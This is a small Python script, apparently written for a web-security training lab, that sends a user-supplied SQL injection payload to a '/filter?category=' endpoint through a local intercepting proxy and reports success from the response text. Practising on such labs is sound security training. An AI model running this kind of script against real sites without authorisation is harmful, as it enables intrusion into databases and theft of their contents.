import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Proxies setup (if you're using a local proxy)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Function to check for SQL injection vulnerability
def exploits_sql(url, payload):
    uri = '/filter?category='
    try:
        r = requests.get(url + uri + payload, verify=False, proxies=proxies)
        # Here you would typically check for SQL errors or unexpected behaviors
        # For simplicity, let's just check if the response contains the known pattern
        if "Accessories Clothing, shoes and accessories Corporate gifts Food & Drink" in r.text:
            return True
        else:
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f"[-] Example: {sys.argv[0]} www.hackThacker.com \"1=1\"")
        sys.exit(-1)

    if exploits_sql(url, payload): 
        print("[+] SQL Injection successful!")
    else:
        print("[-] SQL Injection unsuccessful!")
